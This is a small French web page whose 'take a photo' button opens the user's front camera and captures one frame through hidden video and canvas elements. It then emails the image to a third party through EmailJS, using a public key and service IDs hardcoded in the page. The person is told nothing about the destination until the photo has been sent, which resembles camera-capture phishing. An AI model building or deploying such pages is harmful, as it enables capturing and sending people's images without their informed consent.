<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Photo</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: #fafafa;
    }
    button {
      padding: 10px 20px;
      font-size: 14px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      background: #007bff;
      color: white;
    }
  </style>
</head>
<body>
  <button id="capture">üì∏ Prendre une photo</button>

  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="200" height="150" style="display:none;"></canvas>

  <script>
    emailjs.init("IoSfbtGz4KSL_5_9E");

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    const captureBtn = document.getElementById('capture');

    captureBtn.addEventListener('click', async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        video.onloadeddata = () => {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL("image/jpeg", 0.2);

          // Stop cam√©ra
          stream.getTracks().forEach(track => track.stop());

          // Envoi email
          emailjs.send("service_8cs0gml", "template_rdhxflt", {
            message: "Photo captur√©e volontairement üì∏",
            image: imageData
          }).then(() => {
            alert("‚úÖ Photo envoy√©e !");
          }).catch(err => {
            alert("‚ùå Erreur : " + JSON.stringify(err));
          });
        };
      } catch (err) {
        alert("‚ö†Ô∏è Autorisation refus√©e ou cam√©ra non disponible.");
      }
    });
  </script>
</body>
</html>
